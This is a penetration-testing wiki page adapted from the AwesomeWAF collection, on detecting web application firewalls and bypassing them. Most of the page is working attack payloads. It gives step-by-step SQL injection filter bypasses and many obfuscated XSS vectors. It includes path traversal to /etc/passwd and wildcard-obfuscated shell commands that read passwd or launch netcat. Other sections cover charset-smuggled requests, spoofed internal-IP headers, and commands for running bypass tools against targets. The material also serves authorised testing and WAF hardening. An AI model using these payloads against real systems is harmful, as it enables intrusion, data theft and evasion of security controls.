---
description: via 0xInfection's excellent AwesomeWAF page (in resources)
---

# Testing Methodology/Evasion techniques

#### Where To Look:

* Always look out for common ports that expose that a WAF, namely `80`, `443`, `8000`, `8008`, `8080` and `8088` ports.

  > **Tip:** You can use automate this easily by commandline using tools like like [cURL](https://github.com/curl/curl).

* Some WAFs set their own cookies in requests \(eg. Citrix Netscaler, Yunsuo WAF\).
* Some associate themselves with separate headers \(eg. Anquanbao WAF, Amazon AWS WAF\).
* Some often alter headers and jumble characters to confuse attacker \(eg. Netscaler, Big-IP\).
* Some expose themselves in the `Server` header \(eg. Approach, WTS WAF\).
* Some WAFs expose themselves in the response content \(eg. DotDefender, Armor, Sitelock\).
* Other WAFs reply with unusual response codes upon malicious requests \(eg. WebKnight, 360 WAF\).

#### Detection Techniques:

To identify WAFs, we need to \(dummy\) provoke it.

1. Make a normal GET request from a browser, intercept and record response headers \(specifically cookies\).
2. Make a request from command line \(eg. cURL\), and test response content and headers \(no user-agent included\).
3. Make GET requests to random open ports and grab banners which might expose the WAFs identity.
4. If there is a login page somewhere, try some common \(easily detectable\) payloads like `" or 1 = 1 --`.
5. If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
6. Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
7. Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
8. Make GET requests with outdated protocols like `HTTP/0.9` \(`HTTP/0.9` does not support POST type queries\).
9. Many a times, the WAF varies the `Server` header upon different types of interactions.
10. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.

    > **Tip:** This method could be easily achieved with tools like [HPing3](http://www.hping.org/) or [Scapy](https://scapy.net/).

11. Side Channel Attacks - Examine the timing behaviour of the request and response content.



#### Fuzzing/Bruteforcing:

**Method:**

Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:

* Wordlists specifically for fuzzing
  * [Seclists/Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing).
  * [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
  * [Other Payloads](https://github.com/foospidy/payloads)

**Technique:**

* Load up your wordlist into fuzzer and start the bruteforce.
* Record/log all responses from the different payloads fuzzed.
* Use random user-agents, ranging from Chrome Desktop to iPhone browser.
* If blocking noticed, increase fuzz latency \(eg. 2-4 secs\).
* Always use proxychains, since chances are real that your IP gets blocked.

**Drawbacks:**

* This method often fails.
* Many a times your IP will be blocked \(temporarily/permanently\).

#### Regex Reversing:

**Method:**

* Most efficient method of bypassing WAFs.
* Some WAFs rely upon matching the attack payloads with the signatures in their databases.
* Payload matches the reg-ex the WAF triggers alarm.

**Techniques:**

#### Blacklisting Detection/Bypass

* In this method we try to fingerprint the rules step by step by observing the keywords being blacklisted.
* The idea is to guess the regex and craft the next payloads which doesn't use the blacklisted keywords.

**Case**: SQL Injection

**• Step 1:**

**Keywords Filtered**: `and`, `or`, `union`  
**Probable Regex**: `preg_match('/(and|or|union)/i', $id)`

* **Blocked Attempt**: `union select user, password from users`
* **Bypassed Injection**: `1 || (select user from users where user_id = 1) = 'admin'`

**• Step 2:**

**Keywords Filtered**: `and`, `or`, `union`, `where`

* **Blocked Attempt**: `1 || (select user from users where user_id = 1) = 'admin'`
* **Bypassed Injection**: `1 || (select user from users limit 1) = 'admin'`

**• Step 3:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`

* **Blocked Attempt**: `1 || (select user from users limit 1) = 'admin'`
* **Bypassed Injection**: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`

**• Step 4:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`

* **Blocked Attempt**: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
* **Bypassed Injection**: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`

**• Step 5:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`

* **Blocked Attempt**: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
* **Bypassed Injection**: `1 || 1 = 1 into outfile 'result.txt'`
* **Bypassed Injection**: `1 || substr(user,1,1) = 'a'`

**• Step 6:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`

* **Blocked Attempt**: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
* **Bypassed Injection**: `1 || user_id is not null`
* **Bypassed Injection**: `1 || substr(user,1,1) = 0x61`
* **Bypassed Injection**: `1 || substr(user,1,1) = unhex(61)`

**• Step 7:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`

* **Blocked Attempt**: `1 || substr(user,1,1) = unhex(61)`
* **Bypassed Injection**: `1 || substr(user,1,1) = lower(conv(11,10,36))`

**• Step 8:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`

* **Blocked Attempt**: `1 || substr(user,1,1) = lower(conv(11,10,36))`
* **Bypassed Injection**: `1 || lpad(user,7,1)`

**• Step 9:**

**Keywords Filtered**: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`

* **Blocked Attempt**: `1 || lpad(user,7,1)`
* **Bypassed Injection**: `1%0b||%0blpad(user,7,1)`

#### Obfuscation:

**Method:**

* Encoding payload to different encodings \(a hit and trial approach\).
* You can encode whole payload, or some parts of it and test recursively.

**Techniques:**

**1. Case Toggling**

* Some poorly developed WAFs filter selectively specific case WAFs.
* We can combine upper and lower case characters for developing efficient payloads.

**Standard**: `<script>alert()</script>`  
**Bypassed**: `<ScRipT>alert()</sCRipT>`

**Standard**: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
**Bypassed**: `sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'`

**2. URL Encoding**

* Encode normal payloads with % encoding/URL encoding.
* Can be done with online tools like [this](https://www.url-encode-decode.com/).
* Burp includes a in-built encoder/decoder.

**Blocked**: `<svG/x=">"/oNloaD=confirm()//`  
**Bypassed**: `%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F`

**Blocked**: `uNIoN(sEleCT 1,2,3,4,5,6,7,8,9,10,11,12)`  
**Bypassed**: `uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`

**3. Unicode Normalization**

* ASCII characters in unicode encoding encoding provide great variants for bypassing.
* You can encode entire/part of the payload for obtaining results.

**Standard**: `<marquee onstart=prompt()>`  
**Obfuscated**: `<marquee onstart=\u0070r\u06f\u006dpt()>`

**Blocked**: `/?redir=http://google.com`  
**Bypassed**: `/?redir=http://google。com` \(Unicode alternative\)

**Blocked**: `<marquee loop=1 onfinish=alert()>x`  
**Bypassed**: `＜marquee loop＝1 onfinish＝alert︵1)>x` \(Unicode alternative\)

> **TIP:** Have a look at [this](https://hackerone.com/reports/231444) and [this](https://hackerone.com/reports/231389) reports on HackerOne. :\)

**Standard**: `../../etc/passwd`  
**Obfuscated**: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`

**4. HTML Representation**

* Often web apps encode special characters into HTML encoding and render them accordingly.
* This leads us to basic bypass cases with HTML encoding \(numeric/generic\).

**Standard**: `"><img src=x onerror=confirm()>`  
**Encoded**: `&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;` \(General form\)  
**Encoded**: `&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;` \(Numeric reference\)

**5. Mixed Encoding**

* Sometimes, WAF rules often tend to filter out a specific type of encoding.
* This type of filters can be bypassed by mixed encoding payloads.
* Tabs and newlines further add to obfuscation.

**Obfuscated**:

```text
<A HREF="h
tt  p://6   6.000146.0x7.147/">XSS</A>
```

**6. Using Comments**

* Comments obfuscate standard payload vectors.
* Different payloads have different ways of obfuscation.

**Blocked**: `<script>alert()</script>`  
**Bypassed**: `<!--><script>alert/**/()/**/</script>`

**Blocked**: `/?id=1+union+select+1,2,3--`  
**Bypassed**: `/?id=1+un/**/ion+sel/**/ect+1,2,3--`

**7. Double Encoding**

* Often WAF filters tend to encode characters to prevent attacks.
* However poorly developed filters \(no recursion filters\) can be bypassed with double encoding.

**Standard**: `http://victim/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\`  
**Obfuscated**: `http://victim/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\`

**Standard**: `<script>alert()</script>`  
**Obfuscated**: `%253Cscript%253Ealert()%253C%252Fscript%253E`

**8. Wildcard Obfuscation**

* Globbing patterns are used by various command-line utilities to work with multiple files.
* We can tweak them to execute system commands.
* Specific to remote code execution vulnerabilities on linux systems.

**Standard**: `/bin/cat /etc/passwd`  
**Obfuscated**: `/???/??t /???/??ss??`  
Used chars: `/ ? t s`

**Standard**: `/bin/nc 127.0.0.1 1337`  
**Obfuscated**: `/???/n? 2130706433 1337`  
Used chars: `/ ? n [0-9]`

**9. Dynamic Payload Generation**

* Different programming languages have different syntaxes and patterns for concatenation.
* This allows us to effectively generate payloads that can bypass many filters and rules.

**Standard**: `<script>alert()</script>`  
**Obfuscated**: `<script>eval('al'+'er'+'t()')</script>`

**Standard**: `/bin/cat /etc/passwd`  
**Obfuscated**: `/bi'n'''/c''at' /e'tc'/pa''ss'wd`

> Bash allows path concatenation for execution.

**Standard**: `<iframe/onload='this["src"]="javascript:alert()"';>`  
**Obfuscated**: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t()"';>`

**9. Junk Characters**

* Normal payloads get filtered out easily.
* Adding some junk chars helps avoid detection \(specific cases only\).
* They often help in confusing regex based firewalls.

**Standard**: `<script>alert()</script>`  
**Obfuscated**: `<script>+-+-1-+-+alert(1)</script>`

**Standard**: `<BODY onload=alert()>`  
**Obfuscated**: ``<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>``

> **NOTE:** The above payload can break the regex parser to cause an exception.

**Standard**: `<a href=javascript;alert()>ClickMe`   
**Bypassed**: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`

**10. Line Breaks**

* Many WAF with regex based filtering effectively blocks many attempts.
* Line breaks \(CR/LF\) can break firewall regex and bypass stuff.

**Standard**: `<iframe src=javascript:confirm(0)">`  
**Obfuscated**: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(0)">`

**11. Uninitialized Variables**

* Uninitialized bash variables can evade bad regular expression based filters and pattern match.
* These have value equal to null/they act like empty strings.
* Both bash and perl allow this kind of interpretations.

> **BONUS:** Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on. ;\)

* **Level 1 Obfuscation**: Normal **Standard**: `/bin/cat /etc/passwd` **Obfuscated**: `/bin/cat$u /etc/passwd$u`
* **Level 2 Obfuscation**: Postion Based **Standard**: `/bin/cat /etc/passwd` **Obfuscated**: `$u`**`/bin`**`$u`**`/cat`**`$u $u`**`/etc`**`$u`**`/passwd`**`$u`
* **Level 3 Obfuscation**: Random characters **Standard**: `/bin/cat /etc/passwd` **Obfuscated**: `$aaaaaa`**`/bin`**`$bbbbbb`**`/cat`**`$ccccccc $dddddd`**`/etc`**`$eeeeeee`**`/passwd`**`$fffffff`

An exotic payload crafted:

```text
$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
```

**12. Tabs and Line Feeds**

* Tabs often help to evade firewalls especially regex based ones.
* Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.

**Standard**: `<IMG SRC="javascript:alert();">`  
**Bypassed**: `<IMG SRC=" javascript:alert();">`  
**Variant**: `<IMG SRC=" jav ascri pt:alert ();">`

**Standard**: `http://test.com/test?id=1 union select 1,2,3`  
**Standard**: `http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3`

**Standard**: `<iframe src=javascript:alert(1)></iframe>`  
**Obfuscated**:

```text
<iframe    src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
```

**13. Token Breakers**

* Attacks on tokenizers attempt to break the logic of splitting a request into tokens with the help of token breakers.
* Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
* However, the request must still remain valid while using token-breakers.
* **Case**: Unknown Token for the Tokenizer
  * **Payload**: `?id=‘-sqlite_version() UNION SELECT password FROM users --`
* **Case**: Unknown Context for the Parser \(Notice the uncontexted bracket\)
  * **Payload 1**: `?id=123);DROP TABLE users --`
  * **Payload 2**: `?id=1337) INTO OUTFILE ‘xxx’ --`

> **TIP:** More payloads can be crafted via this [cheat sheet](https://github.com/attackercan/cpp-sql-fuzzer).

**14. Obfuscation in Other Formats**

* Many web applications support different encoding types and can interpret the encoding \(see below\).
* Obfuscating our payload to a format not supported by WAF but the server can smuggle our payload in.

**Case:** IIS

* IIS6, 7.5, 8 and 10 \(ASPX v4.x\) allow **IBM037** character interpretations.
* We can encode our payload and send the encoded parameters with the query.

Original Request:

```text
POST /sample.aspx?id1=something HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Content-Length: 41

id2='union all select * from users--
```

Obfuscated Request + URL Encoding:

```text
POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1
HOST: victim.com
Content-Type: application/x-www-form-urlencoded; charset=ibm037
Content-Length: 115

%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60
```



#### HTTP Parameter Pollution

**Method:**

* This attack method is based on how a server interprets parameters with the same names.
* Possible bypass chances here are:
  * The server uses the last received parameter, and WAF checks only the first.
  * The server unites the value from similar parameters, and WAF checks them separately.

**Technique:**

* The idea is to enumerate how the parameters are being interpreted by the server.
* In such a case we can pass the payload to a parameter which isn't being inspected by the WAF.
* Distributing a payload across parameters which can later get concatenated by the server is also useful.

Below is a comparison of different servers and their relative interpretations:

| **Environment** | **Parameter Interpretation** | **Example** |
| :--- | :--- | :--- |
| ASP/IIS | Concatenation by comma | par1=val1,val2 |
| JSP, Servlet/Apache Tomcat | First parameter is resulting | par1=val1 |
| ASP.NET/IIS | Concatenation by comma | par1=val1,val2 |
| PHP/Zeus | Last parameter is resulting | par1=val2 |
| PHP/Apache | Last parameter is resulting | par1=val2 |
| JSP, Servlet/Jetty | First parameter is resulting | par1=val1 |
| IBM Lotus Domino | First parameter is resulting | par1=val1 |
| IBM HTTP Server | Last parameter is resulting | par1=val2 |
| mod\_perl, libapeq2/Apache | First parameter is resulting | par1=val1 |
| Oracle Application Server 10G | First parameter is resulting | par1=val1 |
| Perl CGI/Apache | First parameter is resulting | par1=val1 |
| Python/Zope | First parameter is resulting | par1=val1 |
| IceWarp | An array is returned | \['val1','val2'\] |
| AXIS 2400 | Last parameter is resulting | par1=val2 |
| DBMan | Concatenation by two tildes | par1=val1~~val2 |
| mod-wsgi \(Python\)/Apache | An array is returned | ARRAY\(0x8b9058c\) |

#### HTTP Parameter Fragmentation

* HPF is based on the principle where the server unites the value being passed along the parameters.
* We can split the payload into different components and then pass the values via the parameters.

**Sample Payload**: `1001 RLIKE (-(-1)) UNION SELECT 1 FROM CREDIT_CARDS`  
**Sample Query URL**: `http://test.com/url?a=1001+RLIKE&b=(-(-1))+UNION&c=SELECT+1&d=FROM+CREDIT_CARDS`

> **TIP:** A real life example how bypasses can be crafted using this method can be found [here](http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2009-August/005673.html).

#### Browser Bugs:

**Charset Bugs:**

* We can try changing charset header to higher Unicode \(eg. UTF-32\) and test payloads.
* When the site decodes the string, the payload gets triggered.

Example request:

```text
GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0
Accept-Charset:utf-32; q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
```

When the site loads, it will be encoded to the UTF-32 encoding that we set, and then as the output encoding of the page is UTF-8, it will be rendered as: `"<script>alert (1) </ script>` which will trigger XSS.

Final URL encoded payload:

```text
%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80 
```

**Null Bytes:**

* The null bytes are commonly used as string terminator.
* This can help us evade many web application filters in case they are not filtering out the null bytes.

Payload examples:

```text
<scri%00pt>alert(1);</scri%00pt>
<scri\x00pt>alert(1);</scri%00pt>
<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>
```

**Standard**: `<a href="javascript:alert()">`  
**Obfuscated**: `<a href="ja0x09vas0x0A0x0Dcript:alert(1)">clickme</a>`  
**Variant**: `<a 0x00 href="javascript:alert(1)">clickme</a>`

**Parsing Bugs:**

* RFC states that NodeNames cannot begin with whitespace.
* But we can use special chars like `%`, `//`, `!`, `?`, etc.

Examples:

* `<// style=x:expression\28write(1)\29>` - Works upto IE7 _\(_[_Source_](http://html5sec.org/#71)_\)_
* `<!--[if]><script>alert(1)</script -->` - Works upto IE9 _\(_[_Reference_](http://html5sec.org/#115)_\)_
* `<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>` - Works in IE7 _\(_[_Reference_](http://html5sec.org/#77)_\)_
* `<%div%20style=xss:expression(prompt(1))>` - Works Upto IE7

**Unicode Separators:**

* Every browser has their own specific charset of separators.
* We can fuzz charset range of `0x00` to `0xFF` and get the set of separators for each browser.
* We can use these separators in places where a space is required.

Here is a compiled list of separators by [@Masato Kinugawa](https://github.com/masatokinugawa):

* IExplorer: `0x09`, `0x0B`, `0x0C`, `0x20`, `0x3B`
* Chrome: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`
* Safari: `0x2C`, `0x3B`
* FireFox: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`
* Opera: `0x09`, `0x20`, `0x2C`, `0x3B`
* Android: `0x09`, `0x20`, `0x28`, `0x2C`, `0x3B`

An exotic payload example:

```text
<a/onmouseover[\x0b]=location='\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B'>pwn3d
```

#### Using Atypical Equivalent Syntactic Structures

* This method aims at finding a way of exploitation not considered by the WAF developers.
* Some use cases can be twitched to critical levels where the WAF cannot detect the payloads at all.
* This payload is accepted and executed by the server after going through the firewall.

Some common keywords overlooked by WAF developers:

* JavaScript functions:
  * `window`
  * `parent`
  * `this`
  * `self`
* Tag attributes:
  * `onwheel`
  * `ontoggle`
  * `onfilterchange`
  * `onbeforescriptexecute`
  * `ondragstart`
  * `onauxclick`
  * `onpointerover`
  * `srcdoc`
* SQL Operators
  * `lpad`
  * `field`
  * `bit_count`

Example Payloads:

* **Case:** XSS

```text
<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
```

* **Case:** SQLi

```text
SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
1%0b||%0bLPAD(USER,7,1)
```

Many alternatives to the original JavaScript can be used, namely:

* [JSFuck](http://www.jsfuck.com/)
* [JJEncode](http://utf-8.jp/public/jjencode.html)
* [XChars.JS](https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html)

> However the problem in using the above syntactical structures is the long payloads which might possibly be detected by the WAF or may be blocked by the CSP. However, you never know, they might bypass the CSP \(if present\) too. ;\)

#### Abusing SSL/TLS Ciphers:

* Many a times, servers do accept connections from various SSL/TLS ciphers and versions.
* Using a cipher to initialise a connection to server which is not supported by the WAF can do our workload.

**Technique:**

* Dig out the ciphers supported by the firewall \(usually the WAF vendor documentation discusses this\).
* Find out the ciphers supported by the server \(tools like [SSLScan](https://github.com/rbsec/sslscan) helps here\).
* If a specific cipher not supported by WAF but by the server, is found, voila!
* Initiating a new connection to the server with that specific cipher should smuggle our payload in.

> **Tool**: [abuse-ssl-bypass-waf](https://github.com/LandGrey/abuse-ssl-bypass-waf)

```text
python abuse-ssl-bypass-waf.py -thread 4 -target <target>
```

CLI tools like cURL can come very handy for PoCs:

```text
curl --ciphers <cipher> -G <test site> -d <payload with parameter>
```

#### Abusing DNS History:

* Often old historical DNS records provide information about the location of the site behind the WAF.
* The target is to get the location of the site, so that we can route our requests directly to the site and not through the WAF.

> **TIP:** Some online services like [IP History](http://www.iphistory.ch/en/) and [DNS Trails](https://securitytrails.com/dns-trails) come to the rescue during the recon process.

**Tool**: [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history)

```text
bash bypass-firewalls-by-DNS-history.sh -d <target> --checkall
```

#### Using Whitelist Strings:

**Method:**

* Some WAF developers keep a shared secret with their users/devs which allows them to pass harmful queries through the WAF.
* This shared secret, if leaked/known, can be used to bypass all protections within the WAF.

**Technique:**

* Using the whitelist string as a paramter in GET/POST/PUT/DELETE requests smuggles our payload through the WAF.
* Usually some `*-sync-request` keywords or a shared token value is used as the secret.

Now when making a request to the server, you can append it as a parameter:

```text
http://host.com/?randomparameter=<malicious-payload>&<shared-secret>=True
```

> A real life example how this works can be found at [this blog](https://osandamalith.com/2019/10/12/bypassing-the-webarx-web-application-firewall-waf/).

#### Request Header Spoofing:

**Method:**

* The target is to fool the WAF/server into believing it was from their internal network.
* Adding some spoofed headers to represent the internal network, does the trick.

**Technique:**

* With each request some set of headers are to be added simultaneously thus spoofing the origin.
* The upstream proxy/WAF misinterprets the request was from their internal network, and lets our gory payload through.

Some common headers used:

```text
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
```

#### Google Dorks Approach:

**Method:**

* There are a lot of known bypasses of various web application firewalls \([see section](https://github.com/0xInfection/Awesome-WAF#known-bypasses)\).
* With the help of google dorks, we can easily find bypasses.

**Techniques:**

Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](http://pdf.textfiles.com/security/googlehackers.pdf).

* Normal search: `+<wafname> waf bypass`
* Searching for specific version exploits: `"<wafname> <version>" (bypass|exploit)`
* For specific type bypass exploits: `"<wafname>" +<bypass type> (bypass|exploit)`
* On [Exploit DB](https://exploit-db.com/): `site:exploit-db.com +<wafname> bypass`
* On [0Day Inject0r DB](https://0day.today/): `site:0day.today +<wafname> <type> (bypass|exploit)`
* On [Twitter](https://twitter.com/): `site:twitter.com +<wafname> bypass`
* On [Pastebin](https://pastebin.com/) `site:pastebin.com +<wafname> bypass`

